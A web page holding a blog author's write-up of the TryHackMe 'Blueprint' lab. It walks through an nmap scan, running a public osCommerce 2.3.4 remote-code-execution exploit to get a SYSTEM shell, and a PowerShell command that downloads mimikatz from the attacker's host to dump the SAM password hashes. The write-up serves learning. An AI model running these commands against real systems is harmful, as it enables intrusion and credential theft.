<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe Blueprint - Cyber Security Write-Up | diecknet</title>
<meta name=keywords content="tryhackme,cyber security"><meta name=description content="I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the TryHackMe room &ldquo;Blueprint&rdquo;.
Tasks
The only info that we have is:

Do you have what is takes to hack into this Windows Machine?

And the questions:


&ldquo;Lab&rdquo; user NTLM hash decrypted
root.txt


So we can assume it&rsquo;s a Windows machine.
Discovery
I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace."><meta name=author content="Andreas Dieckmann"><link rel=canonical href=https://diecknet.de/en/2024/09/24/tryhackme-blueprint/><link crossorigin=anonymous href=/assets/css/stylesheet.75a517428f403193483801122d6350f6956c3bb6bf5c6504311f8c24e6bab3e7.css integrity="sha256-daUXQo9AMZNIOAESLWNQ9pVsO7a/XGUEMR+MJOa6s+c=" rel="preload stylesheet" as=style><link rel=icon href=https://diecknet.de/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://diecknet.de/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://diecknet.de/favicon-32x32.png><link rel=apple-touch-icon href=https://diecknet.de/apple-touch-icon.png><link rel=mask-icon href=https://diecknet.de/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://diecknet.de/en/2024/09/24/tryhackme-blueprint/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="TryHackMe Blueprint - Cyber Security Write-Up"><meta property="og:description" content="I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the TryHackMe room &ldquo;Blueprint&rdquo;.
Tasks
The only info that we have is:

Do you have what is takes to hack into this Windows Machine?

And the questions:


&ldquo;Lab&rdquo; user NTLM hash decrypted
root.txt


So we can assume it&rsquo;s a Windows machine.
Discovery
I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace."><meta property="og:type" content="article"><meta property="og:url" content="https://diecknet.de/en/2024/09/24/tryhackme-blueprint/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-24T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe Blueprint - Cyber Security Write-Up"><meta name=twitter:description content="I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the TryHackMe room &ldquo;Blueprint&rdquo;.
Tasks
The only info that we have is:

Do you have what is takes to hack into this Windows Machine?

And the questions:


&ldquo;Lab&rdquo; user NTLM hash decrypted
root.txt


So we can assume it&rsquo;s a Windows machine.
Discovery
I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://diecknet.de/en/posts/"},{"@type":"ListItem","position":2,"name":"TryHackMe Blueprint - Cyber Security Write-Up","item":"https://diecknet.de/en/2024/09/24/tryhackme-blueprint/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Blueprint - Cyber Security Write-Up","name":"TryHackMe Blueprint - Cyber Security Write-Up","description":"I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the TryHackMe room \u0026ldquo;Blueprint\u0026rdquo;.\nTasks The only info that we have is:\nDo you have what is takes to hack into this Windows Machine?\nAnd the questions:\n\u0026ldquo;Lab\u0026rdquo; user NTLM hash decrypted root.txt So we can assume it\u0026rsquo;s a Windows machine.\nDiscovery I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace.\n","keywords":["tryhackme","cyber security"],"articleBody":"I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the TryHackMe room “Blueprint”.\nTasks The only info that we have is:\nDo you have what is takes to hack into this Windows Machine?\nAnd the questions:\n“Lab” user NTLM hash decrypted root.txt So we can assume it’s a Windows machine.\nDiscovery I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 # create a workspace mkdir Desktop/blueprint \u0026\u0026 cd Desktop/blueprint # portscan with nmap nmap -v -A -oN nmap-scan.txt 10.10.251.173 # nmap result PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: 404 - File or directory not found. |_http-server-header: Microsoft-IIS/7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: | Supported Methods: OPTIONS GET HEAD POST TRACE |_ Potentially risky methods: TRACE |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | ssl-cert: Subject: commonName=localhost | Issuer: commonName=localhost | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2009-11-10T23:48:47 | Not valid after: 2019-11-08T23:48:47 | MD5: a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0 |_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6 |_http-title: Index of / | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | http-methods: | Supported Methods: OPTIONS GET HEAD POST TRACE |_ Potentially risky methods: TRACE |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -20m03s, deviation: 34m37s, median: -4s | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-08-16T18:05:38+01:00 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required | smb2-time: | date: 2024-08-16T17:05:39 |_ start_date: 2024-08-16T17:02:15 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: , NetBIOS MAC: 02:a6:9b:93:fd:95 (unknown) | Names: | BLUEPRINT\u003c00\u003e Flags: | WORKGROUP\u003c00\u003e Flags: | BLUEPRINT\u003c20\u003e Flags: | WORKGROUP\u003c1e\u003e Flags: | WORKGROUP\u003c1d\u003e Flags: |_ \\x01\\x02__MSBROWSE__\\x02\u003c01\u003e Flags: So we can observe:\nWindows 7 Home SP1 / 7601 - wow that’s quite old IIS on Port 80 Apache 2.4.23 on Port 443 and 8080 OSCommerce 2.3.4 PHP 5.6.28 OpenSSL 1.0.2h MSRPC on Port 135 Netbios on Port 139 SMB on Port 445 (stated as microsoft-ds) mySQL/MariaDB on Port 3306 a few high ports with msrpc SMB scan could already retrieve some data as guest All these outdated software’s probably have some vulnerabilities that I can use.\nInitial Access: osCommerce 2.3.4 Exploit Nmap already found a installation of osCommerce - an Online Shop application. The directory name already hints the version: 2.3.4. I quickly searched on Exploit-DB.com for osCommerce and found this exploit (EDB-ID 50128) by Bryan Leong . The underlying issue is, if the /install directory wasn’t removed after installation, it’s possible to execute commands.\nExploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter \u0026 read the system command output from configure.php\nSince I have searchsploit installed on my Kali VM, I probably already have that exploit on disk:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # find the path of the local exploit searchsploit 50128 -p Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2) URL: https://www.exploit-db.com/exploits/50128 Path: /usr/share/exploitdb/exploits/php/webapps/50128.py Codes: N/A Verified: False File Type: Python script, ASCII text executable # execute the exploit, using the URL of the osCommerce installation as a single parameter python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://10.10.251.173:8080/oscommerce-2.3.4/catalog/ [*] Install directory still available, the host likely vulnerable to the exploit. [*] Testing injecting system command to test vulnerability User: nt authority\\system RCE_SHELL$ whoami nt authority\\system Okay, great. I got a shell, and I’m even running as NT Authority\\SYSTEM. I think that’s a major misconfiguration to have the webserver run as SYSTEM, but well… It’s just an easy CTF game.\nRetrieve root flag In CTF’s a root flag is often located on the Administrator’s Desktop (if it’s a Windows machine). So I checked the directory, using the RCE_Shell I got from the Exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 RCE_SHELL$ dir C:\\users\\administrator\\desktop Volume in drive C has no label. Volume Serial Number is 14AF-C52C Directory of C:\\users\\administrator\\desktop 11/27/2019 07:15 PM . 11/27/2019 07:15 PM .. 11/27/2019 07:15 PM 37 root.txt.txt 1 File(s) 37 bytes 2 Dir(s) 19,504,635,904 bytes free RCE_SHELL$ more C:\\users\\administrator\\desktop\\root.txt.txt THM{ **redacted to not ruin the fun** } “Lab” user NTLM hash I already have the necessary permissions (again: I’m running as NT Authority\\SYSTEM). To retrieve the NTLM hash, I chose to spin up a simple local webserver on my Kali machine, to download mimikatz to the target system.\n1 2 # in another terminal: spin up the webserver python3 -m http.server 80 Then in the Exploit shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # download mimikatz using PowerShell RCE_SHELL$ powershell (New-Object System.Net.WebClient).DownloadFile(\\\"http://10.14.85.51/mimikatz.exe\\\", \\\"mimikatz.exe\\\") # dump the local SAM database using mimikatz RCE_SHELL$ mimikatz \"lsadump::sam\" exit .#####. mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz(commandline) # lsadump::sam Domain : BLUEPRINT SysKey : 147a48de4a9815d2aa479598592b086f Local SID : S-1-5-21-3130159037-241736515-3168549210 SAMKey : 3700ddba8f7165462130a4441ef47500 RID : 000001f4 (500) User : Administrator Hash NTLM: **redacted - to not spoil the fun** RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : Lab Hash NTLM: **redacted - to not spoil the fun** mimikatz(commandline) # exit Bye! Neat! So I took the NTLM hash for the Lab user and checked it using NTLM.pw. Since the password was pretty simple, it was listed there.\n","wordCount":"1239","inLanguage":"en","datePublished":"2024-09-24T00:00:00Z","dateModified":"2024-09-24T00:00:00Z","author":{"@type":"Person","name":"Andreas Dieckmann"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://diecknet.de/en/2024/09/24/tryhackme-blueprint/"},"publisher":{"@type":"Organization","name":"diecknet","logo":{"@type":"ImageObject","url":"https://diecknet.de/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://diecknet.de/en/ accesskey=h title="diecknet (Alt + H)">diecknet</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://diecknet.de/de/ title=Deutsch aria-label=Deutsch>Deutsch</a></li><li><a href=https://diecknet.de/en/ title=English aria-label=English><b>English</b></a></li></ul></div></div><ul id=menu><li><a href=https://diecknet.de/en/ title=Home><span>Home</span></a></li><li><a href=https://diecknet.de/en/services/ title=Services><span>Services</span></a></li><li><a href=https://diecknet.de/en/about/ title=About><span>About</span></a></li><li><a href=https://diecknet.de/en/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://diecknet.de/en/archive/ title=Archive><span>Archive</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://diecknet.de/en/>Home</a>&nbsp;»&nbsp;<a href=https://diecknet.de/en/posts/>Posts</a></div><h1 class=post-title>TryHackMe Blueprint - Cyber Security Write-Up</h1><div class=post-meta><span title='2024-09-24 00:00:00 +0000 UTC'>2024-09-24</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Andreas Dieckmann&nbsp;|&nbsp;<a href=https://github.com/diecknet/diecknet-blog/tree/main/content/en/posts/2024/2024-09-24-TryHackMe-Blueprint.md rel="noopener noreferrer" target=_blank>Edit</a></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#tasks aria-label=Tasks>Tasks</a></li><li><a href=#discovery aria-label=Discovery>Discovery</a></li><li><a href=#initial-access-oscommerce-234-exploit aria-label="Initial Access: osCommerce 2.3.4 Exploit">Initial Access: osCommerce 2.3.4 Exploit</a></li><li><a href=#retrieve-root-flag aria-label="Retrieve root flag">Retrieve root flag</a></li><li><a href=#lab-user-ntlm-hash aria-label="&ldquo;Lab&rdquo; user NTLM hash">&ldquo;Lab&rdquo; user NTLM hash</a></li></ul></div></details></div><div class=post-content><p>I decided to try a bit more Penetration Testing/Ethical Hacking. The following is a Write-Up regarding the <a href=https://tryhackme.com/ target=_blank>TryHackMe</a> room <a href=https://tryhackme.com/r/room/blueprint target=_blank>&ldquo;Blueprint&rdquo;</a>.</p><h2 id=tasks>Tasks<a hidden class=anchor aria-hidden=true href=#tasks>#</a></h2><p>The only info that we have is:</p><blockquote><p>Do you have what is takes to hack into this Windows Machine?</p></blockquote><p>And the questions:</p><blockquote><ul><li>&ldquo;Lab&rdquo; user NTLM hash decrypted</li><li>root.txt</li></ul></blockquote><p>So we can assume it&rsquo;s a Windows machine.</p><h2 id=discovery>Discovery<a hidden class=anchor aria-hidden=true href=#discovery>#</a></h2><p>I booted up my Kali linux machine and created a folder on my Desktop to use as a workspace.</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6c7986># create a workspace</span>
</span></span><span style=display:flex><span>mkdir Desktop/blueprint &amp;&amp; <span style=color:#d0a8ff>cd</span> Desktop/blueprint
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># portscan with nmap</span>
</span></span><span style=display:flex><span>nmap -v -A -oN nmap-scan.txt 10.10.251.173
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># nmap result</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE      VERSION
</span></span><span style=display:flex><span>80/tcp    open  http         Microsoft IIS httpd 7.5
</span></span><span style=display:flex><span>|_http-title: <span style=color:#d0bf69>404</span> - File or directory not found.
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
</span></span><span style=display:flex><span>| http-ls: Volume /
</span></span><span style=display:flex><span>| SIZE  TIME              FILENAME
